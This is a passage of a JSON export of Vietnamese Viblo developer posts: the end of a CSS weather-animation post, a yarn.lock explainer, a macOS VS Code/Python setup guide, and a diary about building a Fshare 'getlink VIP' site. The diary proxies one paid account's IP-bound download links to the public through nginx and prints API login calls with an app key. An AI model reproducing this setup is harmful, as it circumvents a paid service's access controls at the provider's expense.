}\n}\n</style>\n```\nMình có làm vài ví dụ so sánh ở đây, mọi người có thể tham khảo nhé: \n{@embed: https://codepen.io/bunnypi04/pen/abOORVB}\n\n# Kết\nBài này đã hướng dẫn mọi người làm các animation thời tiết thường gặp, ngoài ra còn có các kiểu thời tiết như bão, vòi rồng, nắng chảy mỡ, động đất,... nữa mọi người có thể tìm hiểu thêm nhé. Bài này là nguyên liệu cho bài tiếp theo của mình, đấy là lấy dữ liệu thời tiết về và dựa theo đó làm hiệu ứng page cho nó giống thật :D. Hãy chờ bài tiếp theo này nhé :D",
        "published_at": "2020-02-12 11:15:29",
        "is_published": true,
        "updated_at": "2020-02-12 21:40:01",
        "translation_source": null,
        "trend_at": "2020-02-12 14:42:34",
        "promoted_at": null,
        "reading_time": 12,
        "points": 19,
        "views_count": 194,
        "clips_count": 4,
        "comments_count": 17,
        "rated_value": null,
        "promoted": false,
        "trending": true,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/9257f25b-fe31-4259-9970-36ead2adc13a.gif",
        "user": {
            "data": {
                "id": 18003,
                "url": "https://viblo.asia/u/bunny.pi.green",
                "avatar": "c6c99893-cac3-4562-b77d-71beb8e70fee.jpg",
                "name": "Phạm Thu Hằng",
                "username": "bunny.pi.green",
                "followers_count": 52,
                "reputation": 1984,
                "posts_count": 21,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "pure-css",
                    "name": "pure css",
                    "primary": false,
                    "image": "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=pure+css&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "css",
                    "name": "CSS",
                    "primary": false,
                    "image": "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=CSS&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "animation",
                    "name": "Animation",
                    "primary": false,
                    "image": "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Animation&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": [
                {
                    "id": 17051,
                    "url": "https://viblo.asia/u/xdangminhtruongx",
                    "avatar": "36f10f4d-747b-40f3-ad9c-80ad5118a9b8.jpg",
                    "name": "Truong Dang",
                    "username": "xdangminhtruongx",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 18003,
                    "url": "https://viblo.asia/u/bunny.pi.green",
                    "avatar": "c6c99893-cac3-4562-b77d-71beb8e70fee.jpg",
                    "name": "Phạm Thu Hằng",
                    "username": "bunny.pi.green",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 20215,
                    "url": "https://viblo.asia/u/HaiHaChan",
                    "avatar": "a65dcb27-2a50-485b-971a-23987aa88fa3.jpg",
                    "name": "Hải Hà",
                    "username": "HaiHaChan",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 20543,
                    "url": "https://viblo.asia/u/minhnv",
                    "avatar": "d102494e-ccaa-497d-9680-1fbb0ab9a2fe.png",
                    "name": "Nguyễn Văn Minh",
                    "username": "minhnv",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 22200,
                    "url": "https://viblo.asia/u/huyenmini",
                    "avatar": null,
                    "name": "Nguyen Thi Thu Huyen",
                    "username": "huyenmini",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 23173,
                    "url": "https://viblo.asia/u/huyad",
                    "avatar": "6d7e0a0c-ebd3-4150-85ee-4b7bf6ec56ec.jpg",
                    "name": "Huy Phạm",
                    "username": "huyad",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 40282,
                    "url": "https://viblo.asia/u/duongTungPham",
                    "avatar": null,
                    "name": "pham duong",
                    "username": "duongTungPham",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                }
            ]
        }
    },
    {
        "id": 38423,
        "title": "ReactNative : Cách thức hoạt động của file yarn.lock",
        "slug": "63vKjkoRZ2R",
        "url": "https://viblo.asia/p/reactnative-cach-thuc-hoat-dong-cua-file-yarnlock-63vKjkoRZ2R",
        "user_id": 19098,
        "moderation": null,
        "transliterated": "reactnative-cach-thuc-hoat-dong-cua-file-yarnlock",
        "contents_short": "![](https://www.robertcooper.me/static/5b851c1ea6071309c6a5962f5ab70daa/2e8fb/banner.webp)\n\n\n\nMục đích của bài viết này là giải thích chức năng của file yarn.lock cũng như cách cập nhật dependecy với yarn. Rất nhiều người xem nó như một sự phiền toái khi có thêm file bổ xung vào project c...",
        "contents": "![](https://www.robertcooper.me/static/5b851c1ea6071309c6a5962f5ab70daa/2e8fb/banner.webp)\n\nMục đích của bài viết này là giải thích chức năng của file yarn.lock cũng như cách cập nhật dependecy với yarn. Rất nhiều người xem nó như một sự phiền toái khi có thêm file bổ xung vào project của mình và nó thường xuất hiện trong file code review mỗi khi 1 dependecy nào đó được thay đổi (đôi khi file thay đôỉ có thể khá lớn). Mặc dù khá khó chịu nhưng nó là một file quan trọng cần có nó làm việc theo team hoặc làm việc một mình với circle CI\n\n### Cách hoạt động của lock file\nKhi sử dụng yarn để quản lý npm dependecies, một file yarn.lock sẽ tự động được tạo ra. Ngoài ra bất cứ khi nào một dependecy nào được thêm hay bị xoá đi hoặc sửa đổi với yarn CLI (ví dụ chạy lệnh ***yarn install***) thì file yarn.lock cũng sẽ tự động được update \n\nChú ý: Nếu dependency được thay đổi bằng cơm trong file pack.json, thì yarn sẽ update trong yarn.lock vào lần sau khi CLI yarn được sử dụng để cài hay cập nhật các dependecy. Vì vậy khi thay đổi trong file package.json, hay chắc chắn bạn phải chạy lệnh yarn install để update file yarn.lock\n\nMục đích của lock file là khoá cứng version của các dependecy được chỉ định trong file package.json. Điều đó có nghiã là trong yarn.lock file, có một định danh cho mọi dependecy và sub dependecy khi sử dụng project. Ý là định danh là một khối trong yarn.lock miêu tả chính xác version được cài đặt dependecy. Nó sẽ có định dạng như sau \n\n\n```json\nreact@16.8.3:\n    version \"16.8.3\"\n    resolved \"https://registry.yarnpkg.com/react/-/react-16.8.3.tgz#c6f988a2ce895375de216edcfaedd6b9a76451d9\"\n    integrity sha512-3UoSIsEq8yTJuSu0luO1QQWYbgGEILm+eJl2QN/VLDi7hL+EN18M3q3oVZwmVzzBJ3DkM7RMdRwBmZZ+b4IzSA==\n    dependencies:\n    loose-envify \"^1.1.0\"\n    object-assign \"^4.1.1\"\n    prop-types \"^15.6.2\"\n    scheduler \"^0.13.3\"\n```\n\nĐoạn mã định danh ở trên trong file yarn.lock miêu tả chi tiết rằng react version là 16.8.3 đã được cài đặt, và nó cung câos cho URL đăng kí nơi package có thể được cài đặt, và một hàm integrity hash (để chắc chắn rằng dependecy file không bị thay đổi) và list sub dependecies ( dependecy trong dependecy). Nhìn sâu hơn trong file yarn.lock ta sẽ thấy nó định danh cho cả sub dependencies. Ví dụ đây là một định danh khác cho object-assgin sub-dependecy\n\n```json\nobject-assign@^4.1.1: version \"4.1.1\"\n    resolved \"https://registry.yarnpkg.com/object-assign/-/object-assign-4.1.1.tgz#2109adc7965887cfc05cbbd442cac8bfbb360863\"\n    integrity sha1-IQmtx5ZYh8/AXLvUQsrIv7s2CGM=\n```\n    \nVậy lợi ích của việc khoá phiên bản dependecy là gì? Nếu dependency version không được khoá , sau đó tại mọi thời điểm các dependency được cài đặt bởi yarn install, các phụ thuộc được lấy có thể khác nhau, Nếu một trong số các dependency có một new version và phiên bản đó nằm trong range của package.json, thì dependency mới nhất sẽ được cài đặt\n\nChú ý: Nếu thấy phức tạp để nhớ và khó để nắm bắt cách hoạt động của version range. Có một tính toán online giúp ta có cái nhìn trực quan các package cho range version \n\nĐể làm một ví dụ hay lấy một dependency được cài đặt trong package.json\n```json\n\"dependencies\": {\n    \"lodash\": \"^3.9.1\"\n}\n```\n\nGiả sử phiên bản hiện tại của lodash là 3.9.1, sau đó ái đó đã cài đặt dependecies với yarn install, họ sẽ nhận phiên bản 3.9.1 được cài\n\nBây giờ , giả sử loadash có một version mới là 3.9.2 và một nguời khác chạy run install cho package.json được show ở trên. Người đó sẽ nhận được version 3.9.2 của lodash bởi vì phạm vi version được chỉ định trong package version file là ^3.9.1 .  Bây giờ có 2 phiên bản lodash khác nhau được cài đặt là 3.9.1 và 3.9.2, mặc dù tất cả code trong repo là như nhau.  Bạn có thể thấy điều này có thể gây ra các vấn đề là cùng 1 app có thể chạy khác nhau trên 2 máy tính riêng biệt\n\nNào bây giờ xem lại kich bản trên nhưng yarn.lock được sử dụng để khoá các phiên bản dependency, khi ai đó cài đặt dependency, họ sẽ kết thúc theo entry với yarn.lock file \n\n```json\nlodash@^3.9.1:\n    version \"3.9.1\"\n    ...\n```\n\nBây giờ, gỉa sử rằng yarn.lock file được commited trong source control, ai đó có thể pull code trên về máy và chạy yarn install. Bất kể phiên bản hiện tại của lodash là gì thì phiên bản được cài đặt vẫn là 3.9.1 bởi vì nó đã được chỉ định trong yarn.lock file\n\n## How to upgrade dependencies\nBây giờ gắn ví dụ dưới đây theo một dependencies trong package.json \n```json \n\"dependencies\": {\n    \"lodash\": \"^3.9.1\"\n}\n```\n\nNhớ rằng yarn.lock file sẽ khoá version của lodash trong ví dụ ở đây là 3.9.1 \n\n```json \nlodash@^3.9.1:\n    version \"3.9.1\"\n    ...\n```\n\nBây giờ, ai đó sẽ bị nhầm lẫn về lý do tại sao chúng ta chỉ định phạm vi phiên bản trong package.json nế phiên bản được cài đặt luôn giống nhau ngay cả khi phiên bản mới được phát hành. Ví dụ phạm vi của ^3.9.1 nghĩa là nó có thể update những version lớn hơn 3.9.1 và nhỏ hơn 4.0.0 . Dĩ nhiên, nếu version là 3.9.1 được released, 3.9.2 version sẽ không được install nếu version trong lock file vẫn là 3.9.1\n\nĐây là lúc lệnh ***yarn upgrade*** được sử dụng. yarn upgrade cho phép update tất cả các dependecy trong package.json lên version cao nhất trong phạm vi version được ghi trong package.json. Giả sử lock file đang ghi là 3.9.1 mà version hiện tại đã được realese là 3.10.3 , khi chạy yarn upgrade nó sẽ install version 3.10.3 và file yarn.lock file sẽ được thay đổi thành 3.10.3 \n\n```json \nlodash@^3.9.1:\n    version \"3.10.3\"\n    ...\n```\n\n## Updrading dependency to lastest version \n\nĐể nâng cấp lên version mới nhất bỏ qua phạm vi version trong file package.json ta chỉ cần chạy lệnh ***yarn upgrade --lastest***, giả sử phiên bản lodash 4.17.14 được release thì nó sẽ được install về máy, lúc này lock file cũng sẽ được cập nhật thành 4.17.14 \n\n```json \nlodash@^4.17.14:\n    version \"4.17.14\"\n    ...\n```\nyarn cũng sẽ tự động update file package.json thành \n\n```json \n\"dependencies\": {\n    \"lodash\": \"^4.17.14\"\n}\n```\n## Interactive upgrade \nVới một repository có nhiều dependencies, có thể rất hữu ích để xem list dependecies có sẵn có thể upgrade . Chạy yarn ***upgrade-interactive --lastest*** sẽ hiện list tất cả dependencies có thể được cập nhật. Dependencies trong list có thể được chọn và update đến version cao nhất\nDưới đây bạn có thể trông thấy khi ta chạy yarn ***upgrade-interactive --lastest*** \n![](https://www.robertcooper.me/static/b6a8a925802bb63b62a6aa5af29c69cb/17b9f/yarn-upgrade-interactive.png)\nCái này khá hữu ích, ta có thể xem chi tiết từng dependency có thể nâng cấp và cảnh báo về việc thay đổi \n\n> REFER : https://www.robertcooper.me/how-yarn-lock-files-work-and-upgrading-dependencies",
        "published_at": "2020-02-12 11:01:44",
        "is_published": true,
        "updated_at": "2020-02-12 20:00:07",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 6,
        "points": 1,
        "views_count": 25,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://www.robertcooper.me/static/5b851c1ea6071309c6a5962f5ab70daa/2e8fb/banner.webp",
        "user": {
            "data": {
                "id": 19098,
                "url": "https://viblo.asia/u/Nguyen_Trung_Duc",
                "avatar": null,
                "name": "Nguyen Trung Duc ",
                "username": "Nguyen_Trung_Duc",
                "followers_count": 10,
                "reputation": 508,
                "posts_count": 20,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "reactnative",
                    "name": "reactnative",
                    "primary": false,
                    "image": "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=reactnative&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38406,
        "title": "Cài đặt và cấu hình Python3 cho Visual Studio Code hệ điều hành MacOS",
        "slug": "maGK7q1elj2",
        "url": "https://viblo.asia/p/cai-dat-va-cau-hinh-python3-cho-visual-studio-code-he-dieu-hanh-macos-maGK7q1elj2",
        "user_id": 35429,
        "moderation": null,
        "transliterated": "cai-dat-va-cau-hinh-python3-cho-visual-studio-code-he-dieu-hanh-macos",
        "contents_short": "Trước khi cài đặt Visual Studio Code bạn cần phải cài đặt Python. Xem bài viết hướng dẫn dưới đây:\n\nHướng dẫn cài đặt Python\n\nVisual Studio Code: là mã nguồn mở, là công cụ đắc lực cho việc lập trì...",
        "contents": "Trước khi cài đặt Visual Studio Code bạn cần phải cài đặt Python. Xem bài viết hướng dẫn dưới đây:\n\n[Hướng dẫn cài đặt Python](https://viblo.asia/s/huong-dan-cai-dat-python-tren-he-dieu-hanh-windows-macos-linux-2020-b85og8R452G)\n\nVisual Studio Code: là mã nguồn mở, là công cụ đắc lực cho việc lập trình với ưu điểm là nhẹ và hỗ trợ nhiều ngôn ngữ: Python, ReactJS, Node,...\n\nChúng ta sẽ sử dụng Homebrew để cài đặt Visual Studio Code.\n\n**Homebrew** là công cụ quản lý package phổ biến, được sử dụng để cài đặt phần mềm mã nguồn mở như là: Node.\n\n### Cài đặt HomeBrew\n\nMở ứng dụng terminal (/Applications/Utilities/Terminal) và chạy lệnh sau:\n\n```\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n\nTrong lúc cài đặt sẽ yêu cầu bạn nhập mật khẩu, bạn nhập mật khẩu máy tính vào, và đợi cài đặt trong 1-2 phút, tuỳ theo tốc độ mạng.\n\n![Install HomeBrew Terminal](https://images.viblo.asia/03c2442b-c7f7-4406-8132-44720a52f706.png)\n\n### Cài đặt Visual Studio Code\n\nTrước khi cài đặt Visual Studio Code, chúng ta cập nhập HomeBrew bằng lệnh sau:\n\n```\nbrew update\nbrew tap caskroom/cask\n```\n\nSau đó cài đặt Visual Studio Code bằng cách nhập lệnh dưới đây:\n\n```\nbrew cask install visual-studio-code \n```\n\nMở Visual Studio Code (/Applications/Visual Studio Code). Tại màn hình welcome chọn `Add workspace folder...` tạo thư mục với tên là `hello`\n\n![Welcome screen](https://images.viblo.asia/db382e0c-ec8e-41bf-8071-b7ce7900dba0.png)\n\nClick phải vào thư mục, chọn `New File` đặt tên file là `hello_world.py`.\n\n![New File](https://images.viblo.asia/fe3ea0af-c666-4dd8-b1f6-b2bca99af26e.png)\n\nNhập đoạn code sau vào file `hello_world.py`.\n\n```\nprint(\"Hello to Python world!\")\n```\n\nClick vào góc dưới bên trái màn hình chọn phiên bản Python mới nhất, ở đây mình chọn 3.8.1\n\n![Select Python version](https://images.viblo.asia/f942e388-f879-4352-9246-35b7e74dd877.png)\n\nClick phải vào khung soạn thảo văn bản, chọn `Run Python File in Terminal`\n\nKết quả sẽ xuất ra là `Hello to Python world!`\n\n![Hello Result](https://images.viblo.asia/e466ea60-f688-4051-a784-a7149fe1a063.png)\n\n### Tổng kết\n\n**Homebrew** là công cụ quản lý package phổ biến, được sử dụng để cài đặt phần mềm mã nguồn mở.\nSử dụng **Homebrew** giúp cho chúng ta cài đặt Visual Studio Code trong thời gian ngắn.\n\nTrong lúc cài đặt. Nếu có vấn đề khi cài đặt, bạn hãy comment bên dưới, mình sẽ hỗ trợ trong thời gian sớm nhất!\n\nCảm ơn các bạn đã quan tâm bài viết này.\n\nTham khảo\n[Cài đặt Homebrew](https://www.code2bits.com/how-to-install-visual-studio-code-on-macos-using-homebrew/).",
        "published_at": "2020-02-12 09:11:19",
        "is_published": true,
        "updated_at": "2020-02-12 20:16:01",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 2,
        "points": 1,
        "views_count": 17,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/03c2442b-c7f7-4406-8132-44720a52f706.png",
        "user": {
            "data": {
                "id": 35429,
                "url": "https://viblo.asia/u/vuuvinhphuc",
                "avatar": null,
                "name": "Phuc Vuu",
                "username": "vuuvinhphuc",
                "followers_count": 5,
                "reputation": 203,
                "posts_count": 13,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "visual-studio-code",
                    "name": "Visual Studio Code",
                    "primary": false,
                    "image": "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Visual+Studio+Code&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "cai-dat-python",
                    "name": "cài đặt python",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=cài+đặt+python&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "visual-code",
                    "name": "visual code",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=visual+code&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38414,
        "title": "Nhật ký làm hệ thống getLink vip Fshare trong 48h",
        "slug": "m68Z07v6KkG",
        "url": "https://viblo.asia/p/nhat-ky-lam-he-thong-getlink-vip-fshare-trong-48h-m68Z07v6KkG",
        "user_id": 14798,
        "moderation": null,
        "transliterated": "nhat-ky-lam-he-thong-getlink-vip-fshare-trong-48h",
        "contents_short": "Nhật ký ngày tháng năm...\nVào một ngày đẹp trời, mình thấy các website cung cấp dịch vụ getlink VIP fshare đồng loạt thông báo lỗi, không thể getlink VIP download maxbandwith. Và mình cũng thấy rất...",
        "contents": "Nhật ký ngày tháng năm...       \nVào một ngày đẹp trời, mình thấy các website cung cấp dịch vụ `getlink VIP fshare` đồng loạt thông báo lỗi, không thể getlink VIP download `maxbandwith`. Và mình cũng thấy rất nhiều bài viết mới được tạo trong 1 group (chuyên chia sẻ về IT), về việc sharing Fcode (fshare code) mà họ mới mua, và không dùng hết. Các `fcode` thì có hạn về số lượng, và thời gian sử dụng.   \nĐiều đó làm mình lóe lên suy nghĩ về việc tự làm 1 website getLink VIP. Và `Fshare` là dịch vụ mình sẽ thử nghiệm. \n\n// (Nếu có điều kiện, bạn hãy trả fee cho fshare để có thể sử dụng dịch vụ tốt hơn)\n\n## 1. Ý tưởng thiết kế ban đầu\nFshare là 1 hệ thống cung cấp dịch vụ lưu trữ file nổi tiếng. Và để download file với tốc độ max băng thông, thì bạn cần có tài khoản VIP. Và để có tài khoản VIP thì bạn sẽ phải trả phí. Và theo `policy` của fshare thì 1 tài khoản VIP sẽ không bị giới hạn lượt tải, và băng thông tải.   \n=> Mình sẽ làm 1 website mà client sẽ điền form chứa URL tới file cần download. Sau đó server backend sẽ sử dụng tài khoản VIP của mình, request fshare để lấy link download, rồi trả về cho client.    \n\n- **Trở ngại 1...**   \n\nKhông thể làm như vậy được, vì fshare có cơ chế là chỉ địa chỉ IP nào request link download, thì chỉ địa chỉ IP đó mới có thể download được. Trong url download mà fshare trả về, đã được `signed` (link download có truyền thêm các parameter để validate), mình \"đoán\" một trong các param để signed, có `IP address` của client.     \n=> Nếu việc request link không diễn ra ở backend service, thì mình sẽ làm nó ở frontend. \n\n- **Trở ngại 2...**     \n\nViệc để client (frontend) tự động trực tiếp request link với fshare, làm mình lo lắng về việc bảo mật tài khoản VIP của mình. Mình không muốn client có được bất cứ thông tin gì nhạy cảm về tài khoản VIP. Hơn nữa, mình cũng đã thử nghiệm, khá phức tạp để `CORS` tới fshare (sử dụng `ajax` call chéo tới 1 domain khác domain đang chạy). Mình đã debug việc `cors` fshare bằng cách f12 của web browser. Và mình thấy fshare vẫn chấp nhận `cors`, nhưng nó quá phức tạp, khó control.    \n=> Với 2 lý do trên, mình quyết định bỏ cách này. Và quay lại với cách đầu tiên. Get link ở phía backend server. Tuy nhiên, sau khi link download được tạo ra, trả cho client. Mình sẽ cung cấp luôn 1 đường proxy, có nhiệm vụ forward traffic download từ client tới server backend của mình, sau đó mới tới fshare. \n\n- **Trở ngại 3...**\n\nCách này cũng không hoàn hảo, vì việc forward traffic sẽ rất dễ gây `bottleneck` (nghẽn cổ chai) tại server của mình. Tuy nhiên server mà mình đang có, theo quảng cáo là bandwith lên tới 10Gbps. Mình không chắc chắn về performance khi số lượng client sử dụng lên nhiều, nhưng đó sẽ là 1 bài toán ở lĩnh vực khác. Nên mình vẫn quyết định triển theo hướng này.\n\n## 2. Lựa chọn tech stack vòng 1\n- Java vs Spring Framework (Springboot, Spring webservice...): java là ngôn ngữ mình dùng nhiều nhất, và Spring là 1 framework nổi tiếng. Nên mình dùng nó làm phía backend.\n- Frontend: html + css + jquery + ajax. Mình sẽ dùng ajax để call api tới server backend.\n\n## 3. Đi tìm cách kết nối với fshare\nMình đã google, nhưng không thấy fshare có 1 document nào nói về việc `public` API cho các developer.   \nMình lại bắt đầu suy nghĩ lại về việc debug f12 web browser `fshare.vn` để tìm format cho httpClient.       \nThật may mắn, sau đó mình search trên `github` thì lại thấy có repo về getLink fshare. \nĐó là repo này: https://github.com/tudoanh/get_fshare   (dùng python)    \nĐể chắc chắn API trong repo đúng, mình dùng phần mềm `PostMan` để test lại. Và kết quả các API vẫn tốt.     \nCơ bản có 2 API: \n1. Sử dụng `user_email` + `password` trên fshare, để lấy `session_id` và `token`\n    - Request example:\n    ```bash\n    curl --location --request POST 'https://api.fshare.vn/api/user/login' \\\n    --header 'Content-Type: application/json' \\\n    --data-raw '{\n                \"user_email\": \"usename@gmail.com\",\n                \"password\": \"passWord\",\n                \"app_key\": \"L2S7R6ZMagggC5wWkQhX2+aDi467PPuftWUMRFSn\"\n            }\n    '\n    ```\n    - Response example: \n    ```bash\n    {\n    \"code\": 200,\n    \"msg\": \"Login successfully!\",\n    \"token\": \"483f5bb8ab3812070f95b2f52d0ff5645a4f4\",\n    \"session_id\": \"f35jj7d0q5v91dt6b4r3vns\"\n    }\n    ```\n\n2. Sử dụng `token` để request link download\n    - Request example:\n    ```bash\n    curl --location --request POST 'https://api.fshare.vn/api/session/download' \\\n    --header 'Content-Type: application/json' \\\n    --data-raw '{\n                \"token\": \"483f5bb8ab3812070f95b2f52d0ff5645a4f4\",\n                \"url\": \"https://www.fshare.vn/file/VG8998AQNPB\"\n    }'\n    ```\n    - Response example:\n    ```bash\n    {\n        \"location\": \"http://download022.fshare.vn/dl/g1igLGM7IScOwdkwo3iwyPmJPDJk1roRViiVDbNszLZwk4k2xb-6TogmIK9Rjxq4y+Ggl2V0Z/ipz0g78hhb.wmv\"\n    }\n    ```\n// Các example trên mình export từ Postman. Mình đã dùng `Postman` thì thấy luôn ok. Nhưng không hiểu sao khi dùng `curl` lại lỗi. Khá khó hiểu. Hơn nữa, lại chỉ thấy sử dụng `token` chứ không thấy ở đâu sử dụng `session_id`. Về sau khi mình convert sang code Java, thì request thứ 2 luôn báo lỗi là \"chưa đăng nhập\". Sau đó mình phát hiện ra, trong request thứ 2, mình phải truyền thêm `header` chứa `Cookie`, trong đó giá trị `Cookie` có `session_id` thì mới pass.\n\n## 4. Lựa chọn tech stack vòng 2\n### 4.1 Lựa chọn\nViệc dựng project `spring boot` có backend và frontend trong 1 repo khá nhanh. \n- Combo Spring framework\n    - Để call tới API của fshare, cần 1 httpClient. Ban đầu mình định sử dụng `FeignClient`, code của nó khá ngắn. Tuy nhiên mình đã gặp khó khăn trong việc debug lỗi với fshare. Nên mình quyết định quay lại sử dụng `RestTemplate` của Spring. \n    - Ngay khi code `application` được run, mình cần phải lấy giá trị của `session_id`, `token` và lưu vào biến `static`. Mình sử dụng `CommandLineRunner`.\n    - Mình phát hiện ra `session_id` + `token` chỉ sử dụng được trong 1 khoảng thời gian nhất định, có lẽ đây là chính sách của fshare. Vì vậy mình sử dụng thêm `Spring Scheduled` để hẹn giờ call API `rotation/ refresh` lại giá trị token + session_id mới. \n    - Việc client gửi form request lấy link download, và việc server request fshare, nên được chạy bất đồng bộ. Và vì bất đồng bộ, nên mình sử dụng `Spring Websocket` (spring-boot-starter-websocket) để làm 1 kênh gửi kết quả về cho client, sau khi Server run task lấy link download xong. Việc bất đồng bộ này cũng góp phần làm cho website của mình trở nên thân thiện hơn.\n    - Mình sử dụng `ThreadPoolTaskExecutor/TaskExecutor` của Spring, để tạo task cho mỗi request get link. (chạy multi thread)\n\n- Phía client, mình sử dụng `sockjs-client` + `stomp-websocket` để subscribe kênh socket. (subcribe để khi Server chạy task getlink xong, sẽ show kết quả ra phía frontend, mà không phải refresh page). Với mỗi phiên request client, mình sẽ sinh ra 1 topic socket mới. Mục đích để ID. Mình khá lo lắng về việc này sẽ dẫn tới performance của hệ thống giảm xuống nhiều.\n\n### 4.2 Quick code\n- Spring RestTemplate\n```java\n public void setToken() {\n        LoginRequest loginRequest = new LoginRequest();\n        loginRequest.setUser_email(userMail);\n        loginRequest.setPassword(password);\n        loginRequest.setApp_key(appKey);\n        RestTemplate restTemplate = new RestTemplate();\n        LoginResponse loginResponse = restTemplate.postForObject(Const.FSHARE_ENDPOINT_LOGIN, loginRequest, LoginResponse.class);\n        assert loginResponse != null;\n        Const.FSHARE_SESSION_ID = loginResponse.getSession_id();\n        Const.FSHARE_TOKEN = loginResponse.getToken();\n    }\n```\n- CommandLineRunner\n```java\n@Component\npublic class GetToken implements CommandLineRunner {\n    @Autowired\n    private FshareService fshareService;\n\n    @Override\n    public void run(String... strings) {\n        fshareService.setToken();\n    }\n}\n```\n- Spring Scheduled\n```java\n@Component\npublic class RefreshToken {\n    @Autowired\n    private FshareService fshareService;\n\n    @Scheduled(fixedRate = 1000 * 60 * 60 * 2)\n    public void run() {\n        fshareService.setToken();\n    }\n}\n```\n- Spring Websocket\n```java\n@Configuration\n@EnableWebSocketMessageBroker\npublic class WebSocketConfig extends AbstractWebSocketMessageBrokerConfigurer {\n    @Override\n    public void registerStompEndpoints(StompEndpointRegistry stompEndpointRegistry) {\n        stompEndpointRegistry.addEndpoint(\"/websocket-receive-link\")\n                .withSockJS();\n    }\n\n    @Override\n    public void configureMessageBroker(MessageBrokerRegistry registry) {\n        registry.enableSimpleBroker(\"/topic\");\n        registry.setApplicationDestinationPrefixes(\"/app\");\n    }\n}\n```\n\n- ThreadPoolTaskExecutor\n```java\n    @Bean\n    @Primary\n    TaskExecutor taskExecutor() {\n        ThreadPoolTaskExecutor t = new ThreadPoolTaskExecutor();\n        t.setCorePoolSize(10);\n        t.setMaxPoolSize(100);\n        t.setQueueCapacity(500);\n        return t;\n    }\n    \n    //\n    @Autowired\n    private TaskExecutor task;\n\n    //\n    task.execute(new TaskGetLink(requestLink, template, fshareService));\n```\n\n- sockjs-client + stomp-websocket\n```js\nfunction initSocket() {\n    var socket = new SockJS('/websocket-receive-link');\n    stompClient = Stomp.over(socket);\n    stompClient.connect({\"X-Token\": \"tokenvalue\"}, onConnected, onError);\n\n    function onConnected() {\n        stompClient.subscribe(\"/topic/\" + requestId, onMessageReceived);\n    }\n\n    function onMessageReceived(payload) {\n        // todo some thing\n    }\n\n    function onError(error) {\n         // todo some thing\n    }\n}\n```\n\n## 5. Trở ngại 4\nViệc code application về cơ bản đã hoàn thiện kha khá. Mình bắt đầu tìm solution cho việc `proxy traffic` mà mình đã nhắc bên trên. Traffic download sẽ từ client rồi forward qua server của mình, sau đó mới tới fshare. \nMình đã google rất nhiều về cách này, nhưng khá là rối với skill hiện tại.    \nTrong lúc trầm tư suy ngẫm, mình sực nhớ ra `NGINX`, 1 thằng mà mình từng dùng, có thể làm được điều này, 1 điều mà mình lại quên béng mất.     \n=> Ý tưởng:     \nNôm na thì linkdownload của fshare trả về đại loại format sau\n```\nhttp://download022.fshare.vn/dl/g1igLGM7IScOwdkwo3iwyPmJPDJk1roRViimGIL8t7VDbNxb-6TogmIK9Rjxq4y+Ggl2V0Z/ipz0g78hhb.wmv\n```\nTrong đó `download022.fshare.vn` chính là server fshare. Bây giờ mình sẽ biến nó thành `download022.tungexplorer.me` - là địa chỉ server của mình. Và link downoad cho client là:\n```\nhttp://download022.tungexplorer.me/dl/g1igLGM7IScOwdkwo3iwyPmJPDJk1roRViimGIL8t7VDbNxb-6TogmIK9Rjxq4y+Ggl2V0Z/ipz0g78hhb.wmv\n```\n- Việc replace chuỗi String này trong java chỉ 1 nốt nhạc. \n- Cấu hình `Nginx` tham khảo:\n```bash\nserver {\n  listen 80;\n  server_name download03333.tungexplorer.me;\n  access_log off;\n\n  location / {\n    proxy_pass http://download022.fshare.vn;\n    proxy_read_timeout 300;\n    proxy_connect_timeout 300;\n    proxy_redirect     off;\n    proxy_set_header   X-Forwarded-Proto $scheme;\n    proxy_set_header   Host              $http_host;\n    proxy_set_header   X-Real-IP         $remote_addr;\n  }\n}\n```\n\n## 6. Trở ngại 5\nMình phát hiện ra `endpoint` mà fshare cung 